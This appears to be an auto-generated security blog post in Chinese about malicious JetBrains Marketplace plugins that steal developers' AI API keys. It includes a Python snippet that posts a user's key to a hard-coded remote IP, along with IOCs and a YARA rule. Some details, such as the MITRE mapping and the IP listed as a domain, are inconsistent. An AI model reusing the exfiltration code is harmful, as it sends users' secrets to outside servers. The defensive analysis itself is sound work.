---
layout: post
title:  "Malicious JetBrains Marketplace plugins steal AI API keys from developers"
date:   2026-06-17 02:57:36 +0000
categories: [security]
severity: critical
---

# 🚨 解析 JetBrains Marketplace 惡意插件：AI API Key 盜竊攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Info Leak (AI API Key 盜竊)
> * **關鍵技術**: `API Key`, `Plugin`, `JetBrains Marketplace`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 惡意插件在 JetBrains Marketplace 上發佈，利用插件的功能性來竊取用戶的 AI API Key。
* **攻擊流程圖解**: 
  1. 用戶安裝惡意插件
  2. 用戶輸入 AI API Key
  3. 惡意插件將 API Key 傳送到遠端伺服器
  4. 遠端伺服器儲存 API Key
* **受影響元件**: JetBrains Marketplace 上的 15 個插件，包括 DeepSeek AI Assist、CodeGPT AI Assistant 等。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 用戶需要安裝惡意插件並輸入 AI API Key
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 惡意插件的 API Key 傳送邏輯
    def send_api_key(api_key):
        url = "http://39.107.60.51/api/software/key"
        data = {"api_key": api_key}
        response = requests.post(url, data=data)
        return response.text
    
    # 用戶輸入 AI API Key
    api_key = input("請輸入 AI API Key: ")
    
    # 傳送 API Key 到遠端伺服器
    send_api_key(api_key)
    
    ```
* **繞過技術**: 惡意插件可以使用加密或隱碼技術來繞過安全檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| IP | 39.107.60.51 |
| Domain | 39.107.60.51 |
| File Path | /api/software/key |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_plugin {
      meta:
        description = "惡意插件偵測規則"
      strings:
        $api_key_send = "http://39.107.60.51/api/software/key"
      condition:
        $api_key_send
    }
    
    ```
* **緩解措施**: 用戶應該避免安裝來源不明的插件，並定期更新插件和軟件。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **API Key (應用程式介面金鑰)**: 一種用於驗證和授權的金鑰，允許應用程式存取特定的 API 服務。
* **Plugin (插件)**: 一種軟件元件，可以增加或修改現有的軟件功能。
* **JetBrains Marketplace (捷信市場)**: 一個提供各種軟件插件和工具的市場。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/malicious-jetbrains-marketplace-plugins-steal-ai-api-keys-from-developers/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


